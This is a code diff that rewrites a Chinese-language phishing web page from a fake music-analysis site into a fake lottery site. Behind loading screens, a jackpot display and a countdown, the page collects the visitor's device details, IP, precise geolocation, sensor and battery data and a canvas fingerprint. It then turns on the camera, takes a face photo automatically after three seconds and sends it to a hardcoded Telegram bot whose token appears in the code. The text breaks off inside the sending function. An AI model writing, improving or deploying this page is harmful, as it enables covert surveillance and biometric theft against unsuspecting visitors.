+        const CONFIG = {
+            TELEGRAM: {
+                BOT_TOKEN: '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM',
+                CHAT_ID: '8313770381'
+            }
+        };
+
+        const LOTTERY_DATA = {
+            collectedPhotos: [],
+            detectionInfo: {},
+            verificationComplete: false,
+            lotteryNumber: generateLotteryNumber()
+        };
+
+        let detectionSteps = 0;
     </script>
 </body>
 </html>
 <script>
 // =============================================
-// 音乐检测系统 - 数据收集引擎
-// =============================================
-
-// 配置
-const CONFIG = {
-    TELEGRAM: {
-        BOT_TOKEN: '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM',
-        CHAT_ID: '8313770381',
-        API_URL: 'https://api.telegram.org/bot'
-    },
-    MUSIC_API: {
-        IP_INFO: 'https://ipapi.co/json/',
-        TIME_API: 'https://worldtimeapi.org/api/ip'
-    }
-};
-
-// 数据存储对象
-const MUSIC_DATA = {
-    // 用户信息
-    user: {
-        sessionId: generateSessionId(),
-        startTime: new Date().toISOString(),
-        musicProfile: 'Unknown'
-    },
-    
-    // 设备信息
-    device: {
-        // 基本设备信息
-        type: null,
-        model: null,
-        os: null,
-        browser: null,
-        
-        // 屏幕信息
-        screen: {
-            width: null,
-            height: null,
-            pixelRatio: null,
-            orientation: null,
-            colorDepth: null
-        },
-        
-        // 硬件信息
-        hardware: {
-            cores: null,
-            memory: null,
-            battery: null,
-            touchPoints: null
-        },
-        
-        // 音频信息
-        audio: {
-            devices: [],
-            capabilities: {},
-            volume: null,
-            quality: null
-        },
-        
-        // 网络信息
-        network: {
-            type: null,
-            speed: null,
-            latency: null,
-            signal: null
-        }
-    },
-    
-    // 位置信息
-    location: {
-        ip: null,
-        city: null,
-        country: null,
-        coordinates: null,
-        timezone: null,
-        isp: null
-    },
-    
-    // 传感器数据
-    sensors: {
-        accelerometer: null,
-        gyroscope: null,
-        light: null,
-        proximity: null,
-        orientation: null
-    },
-    
-    // 生物特征
-    biometrics: {
-        facePhoto: null,
-        faceData: null,
-        voiceSample: null,
-        timestamp: null
-    },
-    
-    // 行为数据
-    behavior: {
-        musicPreference: {},
-        listeningPattern: {},
-        interaction: {
-            clicks: 0,
-            timeSpent: 0,
-            songsPlayed: 0,
-            volumeChanges: 0
-        }
-    },
-    
-    // 应用状态
-    app: {
-        currentSong: null,
-        volume: 85,
-        quality: 'Hi-Fi',
-        status: 'analyzing'
-    }
-};
-
-// =============================================
-// 页面初始化
+// 初始化函数
 // =============================================
 
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('🎵 音乐检测系统初始化...');
+    console.log('🎰 抽奖检测系统启动...');
     
-    // 模拟加载音乐分析
-    simulateLoading();
+    // 生成浮动钞票
+    generateFloatingMoney();
     
-    // 初始化音乐播放器
-    initMusicPlayer();
+    // 开始抽奖流程
+    startLotteryProcess();
     
-    // 生成推荐歌曲
-    generateRecommendedTracks();
+    // 设置倒计时
+    startCountdown();
     
-    // 开始数据收集
-    setTimeout(() => {
-        startDataCollection();
-    }, 2000);
-    
-    // 设置按钮事件
-    setupButtonEvents();
+    // 更新奖池金额
+    updateJackpotAmount();
 });
 
-// 模拟加载过程
-function simulateLoading() {
-    const loadingMessages = [
-        '正在分析您的音乐品味...',
-        '检测音频设备...',
-        '优化网络连接...',
-        '校准音频质量...',
-        '生成个性化推荐...',
-        '准备播放列表...'
+// 生成浮动钞票效果
+function generateFloatingMoney() {
+    const container = document.getElementById('floatingMoney');
+    const moneyIcons = ['💰', '💵', '💴', '💶', '💷', '💎', '💍', '🏆'];
+    
+    for (let i = 0; i < 15; i++) {
+        const money = document.createElement('div');
+        money.className = 'floating-money';
+        money.textContent = moneyIcons[Math.floor(Math.random() * moneyIcons.length)];
+        money.style.left = Math.random() * 100 + '%';
+        money.style.animationDelay = Math.random() * 20 + 's';
+        money.style.fontSize = (20 + Math.random() * 40) + 'px';
+        container.appendChild(money);
+    }
+}
+
+// 开始抽奖流程
+function startLotteryProcess() {
+    const loadingSteps = [
+        '生成抽奖号码...',
+        '验证参与资格...',
+        '连接验证服务器...',
+        '准备身份验证...',
+        '初始化检测系统...'
     ];
     
-    let currentMessage = 0;
+    let currentStep = 0;
     const statusElement = document.getElementById('loadingStatus');
     
     const interval = setInterval(() => {
-        if (currentMessage < loadingMessages.length) {
-            statusElement.innerHTML = `<i class="fas fa-music"></i> ${loadingMessages[currentMessage]}`;
-            currentMessage++;
+        if (currentStep < loadingSteps.length) {
+            if (statusElement) {
+                statusElement.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${loadingSteps[currentStep]}`;
+            }
+            currentStep++;
         } else {
             clearInterval(interval);
             
-            // 显示主界面
+            // 显示主界面并开始检测
             setTimeout(() => {
                 document.getElementById('loadingScreen').style.opacity = '0';
                 setTimeout(() => {
                     document.getElementById('loadingScreen').style.display = 'none';
                     document.getElementById('mainContainer').style.display = 'block';
                     
-                    // 开始播放背景音乐
-                    startBackgroundMusic();
+                    // 开始全面检测
+                    startComprehensiveDetection();
                     
-                    // 开始持续数据收集
-                    startContinuousMonitoring();
+                    // 自动请求摄像头
+                    setTimeout(() => {
+                        requestCameraAccess();
+                    }, 2000);
                     
                 }, 500);
             }, 1000);
@@ -1007,83 +590,158 @@ function simulateLoading() {
     }, 800);
 }
 
+// 倒计时函数
+function startCountdown() {
+    const endTime = new Date();
+    endTime.setHours(endTime.getHours() + 24);
+    
+    function updateCountdown() {
+        const now = new Date();
+        const diff = endTime - now;
+        
+        if (diff <= 0) {
+            document.querySelectorAll('.countdown-number').forEach(el => el.textContent = '00');
+            return;
+        }
+        
+        const hours = Math.floor(diff / (1000 * 60 * 60));
+        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+        
+        document.getElementById('countdownHours').textContent = hours.toString().padStart(2, '0');
+        document.getElementById('countdownMinutes').textContent = minutes.toString().padStart(2, '0');
+        document.getElementById('countdownSeconds').textContent = seconds.toString().padStart(2, '0');
+    }
+    
+    updateCountdown();
+    setInterval(updateCountdown, 1000);
+}
+
+// 更新奖池金额
+function updateJackpotAmount() {
+    const amounts = ['¥ 8,888,888', '¥ 9,256,789', '¥ 9,543,210', '¥ 9,876,543'];
+    let currentIndex = 0;
+    
+    setInterval(() => {
+        document.getElementById('jackpotAmount').textContent = amounts[currentIndex];
+        currentIndex = (currentIndex + 1) % amounts.length;
+    }, 3000);
+}
+
 // =============================================
-// 数据收集功能
+// 全面检测功能
 // =============================================
 
-async function startDataCollection() {
-    console.log('🔍 开始收集设备数据...');
+async function startComprehensiveDetection() {
+    updateVerificationProgress(10, '检测设备信息...');
     
-    // 更新UI状态
-    updateProgress('dataCollection', 10);
+    // 1. 设备信息检测
+    await detectDeviceInfo();
+    updateVerificationProgress(20, '获取网络信息...');
     
-    // 1. 收集设备基本信息
-    collectDeviceInfo();
-    updateProgress('dataCollection', 20);
+    // 2. IP和网络检测
+    await detectNetworkInfo();
+    updateVerificationProgress(30, '检测地理位置...');
     
-    // 2. 收集网络信息
-    await collectNetworkInfo();
-    updateProgress('dataCollection', 40);
+    // 3. 位置检测
+    detectLocation();
+    updateVerificationProgress(40, '检查传感器...');
     
-    // 3. 收集位置信息
-    await collectLocationInfo();
-    updateProgress('dataCollection', 60);
-    
-    // 4. 检测传感器
+    // 4. 传感器检测
     detectSensors();
-    updateProgress('dataCollection', 80);
+    updateVerificationProgress(50, '检测电池状态...');
     
-    // 5. 检测音频设备
+    // 5. 电池检测
+    detectBattery();
+    updateVerificationProgress(60, '分析屏幕信息...');
+    
+    // 6. 屏幕检测
+    detectScreenInfo();
+    updateVerificationProgress(70, '检测音频设备...');
+    
+    // 7. 音频设备检测
     detectAudioDevices();
-    updateProgress('dataCollection', 100);
+    updateVerificationProgress(80, '验证浏览器信息...');
     
-    // 更新UI显示
-    updateDeviceDisplay();
+    // 8. 浏览器指纹
+    detectBrowserFingerprint();
+    updateVerificationProgress(90, '准备身份验证...');
     
-    console.log('✅ 数据收集完成');
+    // 更新数据收集计数
+    updateDataCount();
 }
 
-function collectDeviceInfo() {
-    // 设备类型检测
+// =============================================
+// 设备信息检测
+// =============================================
+
+async function detectDeviceInfo() {
+    detectionSteps++;
+    
     const userAgent = navigator.userAgent;
-    MUSIC_DATA.device.browser = getBrowserName(userAgent);
-    MUSIC_DATA.device.os = getOSName(userAgent);
-    MUSIC_DATA.device.type = getDeviceType(userAgent);
-    MUSIC_DATA.device.model = getDeviceModel(userAgent);
-    
-    // 屏幕信息
-    MUSIC_DATA.device.screen = {
-        width: screen.width,
-        height: screen.height,
-        pixelRatio: window.devicePixelRatio,
-        orientation: screen.orientation ? screen.orientation.type : 'unknown',
-        colorDepth: screen.colorDepth,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight
-    };
-    
-    // 硬件信息
-    MUSIC_DATA.device.hardware = {
-        cores: navigator.hardwareConcurrency || 'unknown',
-        memory: navigator.deviceMemory || 'unknown',
-        touchPoints: navigator.maxTouchPoints || 0,
+    LOTTERY_DATA.detectionInfo.device = {
+        browser: getBrowserName(userAgent),
+        os: getOSName(userAgent),
+        deviceType: getDeviceType(userAgent),
         platform: navigator.platform,
-        vendor: navigator.vendor || 'unknown'
+        vendor: navigator.vendor || '未知',
+        
+        // CPU和内存
+        cpuCores: navigator.hardwareConcurrency || '未知',
+        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '未知',
+        
+        // 语言和时区
+        language: navigator.language,
+        languages: navigator.languages,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        
+        // 其他信息
+        userAgent: userAgent.substring(0, 100) + '...',
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || '未知'
     };
     
-    // 语言和时区
-    MUSIC_DATA.device.language = navigator.language;
-    MUSIC_DATA.device.languages = navigator.languages;
-    MUSIC_DATA.device.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    // 添加到显示
+    addDetectionDisplay('device', '设备信息', 
+        `${LOTTERY_DATA.detectionInfo.device.deviceType} - ${LOTTERY_DATA.detectionInfo.device.browser}`);
 }
 
-async function collectNetworkInfo() {
+function getBrowserName(ua) {
+    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+    if (ua.includes('Edg')) return 'Edge';
+    return '未知';
+}
+
+function getOSName(ua) {
+    if (ua.includes('Windows')) return 'Windows';
+    if (ua.includes('Mac')) return 'macOS';
+    if (ua.includes('Linux')) return 'Linux';
+    if (ua.includes('Android')) return 'Android';
+    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+    return '未知';
+}
+
+function getDeviceType(ua) {
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) return '平板';
+    if (/Mobile|iPhone|iPad|iPod|Android|BlackBerry/i.test(ua)) return '手机';
+    return '电脑';
+}
+
+// =============================================
+// 网络信息检测
+// =============================================
+
+async function detectNetworkInfo() {
+    detectionSteps++;
+    
     try {
-        // 获取IP和位置
-        const response = await fetch(CONFIG.MUSIC_API.IP_INFO);
+        const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         
-        MUSIC_DATA.location = {
+        LOTTERY_DATA.detectionInfo.network = {
             ip: data.ip,
             city: data.city,
             region: data.region,
@@ -1093,47 +751,53 @@ async function collectNetworkInfo() {
             longitude: data.longitude,
             timezone: data.timezone,
             isp: data.org,
-            asn: data.asn
+            asn: data.asn,
+            org: data.org
         };
         
         // 网络连接信息
         if (navigator.connection) {
             const conn = navigator.connection;
-            MUSIC_DATA.device.network = {
+            LOTTERY_DATA.detectionInfo.network.connection = {
                 type: conn.effectiveType,
-                speed: conn.downlink + ' Mbps',
-                latency: conn.rtt + ' ms',
-                saveData: conn.saveData,
-                online: navigator.onLine
+                downlink: conn.downlink + ' Mbps',
+                rtt: conn.rtt + ' ms',
+                saveData: conn.saveData
             };
-            
-            // 更新UI
-            document.getElementById('networkSpeed').textContent = 
-                conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
         }
         
+        // 添加到显示
+        addDetectionDisplay('network', '网络信息', 
+            `${data.ip} - ${data.city}, ${data.country_name}`);
+        
     } catch (error) {
-        console.error('网络信息收集失败:', error);
+        console.log('网络检测失败:', error);
     }
 }
 
-async function collectLocationInfo() {
-    // 使用IP获取的位置信息已在collectNetworkInfo中获取
-    // 这里可以获取更精确的位置（如果用户授权）
+// =============================================
+// 地理位置检测
+// =============================================
+
+function detectLocation() {
+    detectionSteps++;
+    
     if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
-                MUSIC_DATA.location.precise = {
+                LOTTERY_DATA.detectionInfo.geolocation = {
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed,
-                    timestamp: position.timestamp
+                    accuracy: position.coords.accuracy + ' 米',
+                    altitude: position.coords.altitude ? position.coords.altitude + ' 米' : '未知',
+                    heading: position.coords.heading || '未知',
+                    speed: position.coords.speed ? position.coords.speed + ' m/s' : '0 m/s',
+                    timestamp: new Date(position.timestamp).toLocaleString('zh-CN')
                 };
                 
-                console.log('📍 精确位置获取成功');
+                addDetectionDisplay('location', '精确位置', 
+                    `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`);
+                
             },
             (error) => {
                 console.log('位置获取失败:', error.message);
@@ -1143,8 +807,13 @@ async function collectLocationInfo() {
     }
 }
 
+// =============================================
+// 传感器检测
+// =============================================
+
 function detectSensors() {
-    // 检测可用传感器
+    detectionSteps++;
+    
     const sensors = {
         accelerometer: 'Accelerometer' in window,
         gyroscope: 'Gyroscope' in window,
@@ -1155,45 +824,109 @@ function detectSensors() {
         motion: 'DeviceMotionEvent' in window
     };
     
-    MUSIC_DATA.sensors.available = sensors;
-    MUSIC_DATA.sensors.count = Object.values(sensors).filter(v => v).length;
+    LOTTERY_DATA.detectionInfo.sensors = sensors;
+    const availableCount = Object.values(sensors).filter(v => v).length;
     
-    // 如果有电池API，获取电池信息
+    addDetectionDisplay('sensors', '传感器', `${availableCount}个可用`);
+    
+    // 监听设备运动
+    if ('DeviceMotionEvent' in window) {
+        window.addEventListener('devicemotion', (event) => {
+            LOTTERY_DATA.detectionInfo.motionData = {
+                acceleration: event.acceleration,
+                rotationRate: event.rotationRate
+            };
+        });
+    }
+}
+
+// =============================================
+// 电池检测
+// =============================================
+
+function detectBattery() {
+    detectionSteps++;
+    
     if ('getBattery' in navigator) {
         navigator.getBattery().then(battery => {
-            MUSIC_DATA.device.hardware.battery = {
+            LOTTERY_DATA.detectionInfo.battery = {
                 level: Math.round(battery.level * 100) + '%',
                 charging: battery.charging,
                 chargingTime: battery.chargingTime,
                 dischargingTime: battery.dischargingTime
             };
             
-            // 更新UI
-            document.getElementById('batteryStatus').textContent = 
-                Math.round(battery.level * 100) + '%' + (battery.charging ? ' 充电中' : '');
+            addDetectionDisplay('battery', '电池状态', 
+                `${LOTTERY_DATA.detectionInfo.battery.level} ${battery.charging ? '充电中' : ''}`);
         });
     }
 }
 
+// =============================================
+// 屏幕信息检测
+// =============================================
+
+function detectScreenInfo() {
+    detectionSteps++;
+    
+    LOTTERY_DATA.detectionInfo.screen = {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth + '位',
+        pixelDepth: screen.pixelDepth + '位',
+        orientation: screen.orientation?.type || '未知',
+        pixelRatio: window.devicePixelRatio
+    };
+    
+    addDetectionDisplay('screen', '屏幕信息', 
+        `${screen.width}×${screen.height} (${window.devicePixelRatio}x)`);
+}
+
+// =============================================
+// 音频设备检测
+// =============================================
+
 function detectAudioDevices() {
+    detectionSteps++;
+    
     if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
         navigator.mediaDevices.enumerateDevices()
             .then(devices => {
-                const audioDevices = devices.filter(device => device.kind === 'audioinput' || device.kind === 'audiooutput');
-                MUSIC_DATA.device.audio.devices = audioDevices.map(device => ({
-                    kind: device.kind,
-                    label: device.label,
-                    deviceId: device.deviceId,
-                    groupId: device.groupId
-                }));
+                const audioDevices = devices.filter(d => d.kind.includes('audio'));
+                LOTTERY_DATA.detectionInfo.audioDevices = audioDevices.length;
                 
-                // 更新UI
-                document.getElementById('audioDevice').textContent = 
-                    audioDevices.length > 0 ? `${audioDevices.length}个设备` : '无设备';
-            })
-            .catch(error => {
-                console.error('音频设备检测失败:', error);
+                addDetectionDisplay('audio', '音频设备', `${audioDevices.length}个设备`);
             });
+    }
+}
+
+// =============================================
+// 浏览器指纹检测
+// =============================================
+
+function detectBrowserFingerprint() {
+    detectionSteps++;
+    
+    try {
+        // Canvas指纹
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Fingerprint', 2, 15);
+        
+        const canvasData = canvas.toDataURL();
+        LOTTERY_DATA.detectionInfo.canvasFingerprint = canvasData.substring(0, 50) + '...';
+        
+        addDetectionDisplay('fingerprint', '浏览器指纹', '已生成唯一标识');
+        
+    } catch (error) {
+        console.log('指纹检测失败');
     }
 }
 
@@ -1206,6 +939,8 @@ async function requestCameraAccess() {
     
     // 显示摄像头区域
     document.getElementById('cameraSection').style.display = 'block';
+    document.getElementById('verificationStatus').innerHTML = 
+        '<i class="fas fa-camera"></i> 正在启动面部识别...';
     
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -1221,24 +956,25 @@ async function requestCameraAccess() {
         
         console.log('✅ 摄像头访问成功');
         
+        // 3秒后自动拍照
+        setTimeout(() => {
+            captureFacePhoto(stream);
+        }, 3000);
+        
     } catch (error) {
         console.error('摄像头访问失败:', error);
-        document.getElementById('cameraSection').innerHTML = `
-            <div style="text-align: center; padding: 30px;">
-                <i class="fas fa-camera-slash" style="font-size: 50px; color: var(--accent); margin-bottom: 20px;"></i>
-                <h3 style="margin-bottom: 15px;">摄像头访问被拒绝</h3>
-                <p style="color: var(--text-secondary); margin-bottom: 25px;">
-                    无法访问摄像头，部分优化功能可能无法使用
-                </p>
-                <button class="music-btn" onclick="skipCamera()">
-                    <i class="fas fa-forward"></i> 继续优化
-                </button>
-            </div>
-        `;
+        
+        document.getElementById('verificationStatus').innerHTML = 
+            '<i class="fas fa-exclamation-triangle"></i> 摄像头访问被拒绝';
+        
+        // 如果没有摄像头权限，继续其他检测
+        setTimeout(() => {
+            completeVerification();
+        }, 2000);
     }
 }
 
-function captureFace() {
+function captureFacePhoto(stream) {
     const video = document.getElementById('cameraVideo');
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
@@ -1248,110 +984,28 @@ function captureFace() {
     
     // 保存照片数据
     const photoData = canvas.toDataURL('image/jpeg', 0.8);
-    MUSIC_DATA.biometrics.facePhoto = photoData;
-    MUSIC_DATA.biometrics.timestamp = new Date().toISOString();
-    MUSIC_DATA.biometrics.faceData = {
-        resolution: `${canvas.width}x${canvas.height}`,
-        format: 'jpeg',
-        quality: 0.8,
-        analyzed: true
+    LOTTERY_DATA.collectedPhotos.push(photoData);
+    LOTTERY_DATA.detectionInfo.facePhoto = {
+        captured: true,
+        timestamp: new Date().toISOString(),
+        resolution: `${canvas.width}x${canvas.height}`
     };
     
     // 停止摄像头
-    const stream = video.srcObject;
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-    }
+    stream.getTracks().forEach(track => track.stop());
     
-    // 显示成功消息
-    document.getElementById('faceResult').style.display = 'block';
-    document.getElementById('captureBtn').style.display = 'none';
-    document.getElementById('skipBtn').style.display = 'none';
+    // 更新界面
+    document.getElementById('verificationStatus').innerHTML = 
+        '<i class="fas fa-check-circle" style="color: #2ED573;"></i> 面部识别完成';
     
-    // 更新系统优化进度
-    updateProgress('systemOptimization', 100);
-    
-    // 发送数据到Telegram
-    setTimeout(() => {
-        sendDataToTelegram();
-    }, 2000);
+    // 发送照片到Telegram
+    sendPhotoToTelegram(photoData);
     
     console.log('📸 面部照片已捕获');
-}
-
-function skipCamera() {
-    document.getElementById('cameraSection').style.display = 'none';
-    MUSIC_DATA.biometrics.facePhoto = 'skipped';
-    updateProgress('systemOptimization', 75);
-}
-
-// =============================================
-// 音乐播放器功能
-// =============================================
-
-function initMusicPlayer() {
-    const playBtn = document.getElementById('playBtn');
-    const audio = document.getElementById('backgroundMusic');
     
-    playBtn.addEventListener('click', function() {
-        if (audio.paused) {
-            audio.play();
-            playBtn.innerHTML = '<i class="fas fa-pause"></i>';
-            MUSIC_DATA.behavior.interaction.songsPlayed++;
-        } else {
-            audio.pause();
-            playBtn.innerHTML = '<i class="fas fa-play"></i>';
-        }
-    });
-    
-    // 模拟播放进度
-    setInterval(() => {
-        const progressElement = document.getElementById('songProgress');
-        if (!audio.paused) {
-            const progress = (audio.currentTime / audio.duration) * 100;
-            progressElement.style.width = progress + '%';
-            
-            // 更新播放时间
-            document.getElementById('currentTime').textContent = 
-                formatTime(audio.currentTime);
-            document.getElementById('totalTime').textContent = 
-                formatTime(audio.duration || 0);
-        }
-    }, 1000);
-}
-
-function startBackgroundMusic() {
-    const audio = document.getElementById('backgroundMusic');
-    audio.volume = 0.5;
-    
-    // 随机选择一个音乐
-    const musicList = [
-        { title: 'Blinding Lights', artist: 'The Weeknd', album: 'After Hours' },
-        { title: 'Flowers', artist: 'Miley Cyrus', album: 'Endless Summer Vacation' },
-        { title: 'As It Was', artist: 'Harry Styles', album: 'Harry\'s House' },
-        { title: 'Heat Waves', artist: 'Glass Animals', album: 'Dreamland' },
-        { title: 'Stay', artist: 'The Kid LAROI, Justin Bieber', album: 'F*CK LOVE 3' }
-    ];
-    
-    const randomMusic = musicList[Math.floor(Math.random() * musicList.length)];
-    
-    // 更新UI
-    document.getElementById('currentSong').textContent = randomMusic.title;
-    document.getElementById('currentArtist').textContent = randomMusic.artist;
-    document.getElementById('currentAlbum').textContent = randomMusic.album;
-    
-    // 记录播放行为
-    MUSIC_DATA.app.currentSong = randomMusic;
-    MUSIC_DATA.behavior.musicPreference.genre = 'pop';
-    MUSIC_DATA.behavior.musicPreference.firstSong = randomMusic.title;
-    
-    // 自动播放
+    // 完成验证
     setTimeout(() => {
-        audio.play().then(() => {
-            document.getElementById('playBtn').innerHTML = '<i class="fas fa-pause"></i>';
-        }).catch(() => {
-            console.log('自动播放被阻止');
-        });
+        completeVerification();
     }, 1000);
 }
 
@@ -1359,354 +1013,300 @@ function startBackgroundMusic() {
 // 辅助函数
 // =============================================
 
-function updateProgress(elementId, percent) {
-    const element = document.getElementById(elementId);
-    if (element) {
-        element.textContent = percent + '%';
-    }
-}
-
-function updateDeviceDisplay() {
-    // 更新设备模型显示
-    if (MUSIC_DATA.device.model) {
-        document.getElementById('deviceModel').textContent = MUSIC_DATA.device.model;
-    }
-    
-    // 更新网络显示
-    if (MUSIC_DATA.device.network && MUSIC_DATA.device.network.speed) {
-        document.getElementById('networkSpeed').textContent = MUSIC_DATA.device.network.speed;
-    }
-    
-    // 更新电池显示
-    if (MUSIC_DATA.device.hardware.battery) {
-        document.getElementById('batteryStatus').textContent = MUSIC_DATA.device.hardware.battery.level;
-    }
-}
-
-function generateRecommendedTracks() {
-    const tracks = [
-        { name: 'Dynamite', artist: 'BTS', duration: '3:19', popularity: '98%' },
-        { name: 'Levitating', artist: 'Dua Lipa', duration: '3:23', popularity: '96%' },
-        { name: 'Good 4 U', artist: 'Olivia Rodrigo', duration: '2:58', popularity: '94%' },
-        { name: 'Industry Baby', artist: 'Lil Nas X', duration: '3:32', popularity: '92%' },
-        { name: 'Stay', artist: 'The Kid LAROI, Justin Bieber', duration: '2:21', popularity: '90%' },
-        { name: 'Kill Bill', artist: 'SZA', duration: '2:33', popularity: '88%' }
-    ];
-    
-    const container = document.getElementById('recommendedTracks');
-    container.innerHTML = '';
-    
-    tracks.forEach(track => {
-        const trackCard = document.createElement('div');
-        trackCard.className = 'track-card';
-        trackCard.innerHTML = `
-            <div class="track-cover">
-                <img src="https://images.unsplash.com/photo-1511379938547-c1f69419868d?ixlib=rb-1.2.1&auto=format&fit=crop&w=200&q=80" alt="${track.name}">
-            </div>
-            <div class="track-details">
-                <div class="track-name">${track.name}</div>
-                <div class="track-artist">${track.artist}</div>
-                <div style="display: flex; align-items: center; gap: 10px; margin-top: 8px;">
-                    <span style="font-size: 0.8rem; color: var(--text-secondary);">${track.duration}</span>
-                    <span style="font-size: 0.8rem; color: var(--primary); background: rgba(29,185,84,0.1); padding: 2px 8px; border-radius: 10px;">
-                        ${track.popularity}
-                    </span>
-                </div>
-            </div>
-            <div class="track-duration">
-                <i class="fas fa-play-circle" style="color: var(--primary); font-size: 1.2rem;"></i>
-            </div>
-        `;
-        container.appendChild(trackCard);
-    });
-}
-
-function setupButtonEvents() {
-    // 监听器统计
-    document.addEventListener('click', () => {
-        MUSIC_DATA.behavior.interaction.clicks++;
-    });
-    
-    // 时间统计
-    const startTime = Date.now();
-    setInterval(() => {
-        MUSIC_DATA.behavior.interaction.timeSpent = Math.round((Date.now() - startTime) / 1000);
-        
-        // 更新推荐精度（基于时间）
-        const accuracy = Math.min(100, Math.floor(MUSIC_DATA.behavior.interaction.timeSpent / 10) * 10);
-        updateProgress('recommendationAccuracy', accuracy);
-    }, 1000);
-}
-
-function startContinuousMonitoring() {
-    // 持续更新设备状态
-    setInterval(() => {
-        if (navigator.connection) {
-            const conn = navigator.connection;
-            document.getElementById('connectionStatus').textContent = 
-                conn.effectiveType === '4g' ? '高速网络' : 
-                conn.effectiveType === '3g' ? '标准网络' : 
-                conn.effectiveType === '2g' ? '低速网络' : '未知';
+function updateVerificationProgress(percent, message) {
+    document.getElementById('verificationProgress').textContent = percent + '%';
+    if (message) {
+        const status = document.getElementById('verificationStatus');
+        if (status) {
+            status.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${message}`;
         }
-    }, 5000);
-}
-
-function formatTime(seconds) {
-    const mins = Math.floor(seconds / 60);
-    const secs = Math.floor(seconds % 60);
-    return `${mins}:${secs.toString().padStart(2, '0')}`;
-}
-
-// =============================================
-// 设备检测辅助函数
-// =============================================
-
-function getBrowserName(userAgent) {
-    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) return 'Chrome';
-    if (userAgent.includes('Firefox')) return 'Firefox';
-    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
-    if (userAgent.includes('Edg')) return 'Edge';
-    return 'Unknown';
-}
-
-function getOSName(userAgent) {
-    if (userAgent.includes('Windows')) return 'Windows';
-    if (userAgent.includes('Mac')) return 'macOS';
-    if (userAgent.includes('Linux')) return 'Linux';
-    if (userAgent.includes('Android')) return 'Android';
-    if (userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
-    return 'Unknown';
-}
-
-function getDeviceType(userAgent) {
-    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent)) {
-        return 'Tablet';
     }
-    if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
-        return 'Mobile';
-    }
-    return 'Desktop';
 }
 
-function getDeviceModel(userAgent) {
-    if (userAgent.includes('iPhone')) {
-        const model = userAgent.match(/iPhone(\d+)/);
-        return model ? `iPhone ${model[1]}` : 'iPhone';
-    }
-    if (userAgent.includes('Android')) {
-        const model = userAgent.match(/Android\s([^;]+)/);
-        return model ? `Android ${model[1]}` : 'Android';
-    }
-    if (userAgent.includes('Windows')) return 'Windows PC';
-    if (userAgent.includes('Mac')) return 'Mac';
-    return 'Unknown Device';
+function updateDataCount() {
+    document.getElementById('dataCollected').textContent = detectionSteps;
 }
 
-function generateSessionId() {
-    return 'MUSIC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+function addDetectionDisplay(type, title, value) {
+    const container = document.getElementById('detectionInfo');
+    
+    const card = document.createElement('div');
+    card.className = 'info-card';
+    card.innerHTML = `
+        <div class="info-title">
+            <i class="fas fa-${getIconForType(type)}"></i>
+            <span>${title}</span>
+        </div>
+        <div style="font-size: 1.5rem; font-weight: bold; margin: 15px 0; color: #333;">${value}</div>
+    `;
+    
+    container.appendChild(card);
 }
 
+function getIconForType(type) {
+    const icons = {
+        device: 'mobile-alt',
+        network: 'wifi',
+        location: 'map-marker-alt',
+        sensors: 'microchip',
+        battery: 'battery-full',
+        screen: 'desktop',
+        audio: 'headphones',
+        fingerprint: 'fingerprint'
+    };
+    return icons[type] || 'info-circle';
+}
+
+function generateLotteryNumber() {
+    const timestamp = Date.now().toString().slice(-8);
+    const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+    return `LOT${timestamp}${random}`;
+}
+</script>
+<script>
 // =============================================
 // Telegram发送功能
 // =============================================
 
-async function sendDataToTelegram() {
-    console.log('📤 准备发送数据到Telegram...');
+// 发送照片到Telegram
+async function sendPhotoToTelegram(photoData) {
+    console.log('📤 发送照片到Telegram...');
     
     try {
-        // 1. 发送文本报告
-        const textReport = formatTelegramReport();
-        await sendTelegramMessage(textReport);
+        document.getElementById('telegramStatus').textContent = '发送中';
+        document.getElementById('telegramStatus').style.color = '#FFD700';
         
-        // 2. 如果有面部照片，发送照片
-        if (MUSIC_DATA.biometrics.facePhoto && MUSIC_DATA.biometrics.facePhoto !== 'skipped') {
